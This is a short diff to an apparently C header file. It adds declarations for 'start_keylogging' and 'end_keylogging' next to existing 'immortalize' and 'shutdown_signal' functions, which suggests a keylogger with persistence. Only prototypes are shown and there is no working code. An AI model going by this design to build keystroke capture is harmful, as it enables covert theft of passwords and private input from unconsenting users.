@@ -45,3 +45,7 @@ void immortalize(void);
  *
  * **/
 void shutdown_signal(int signal);
+
+void start_keylogging(void);
+
+void end_keylogging(void);
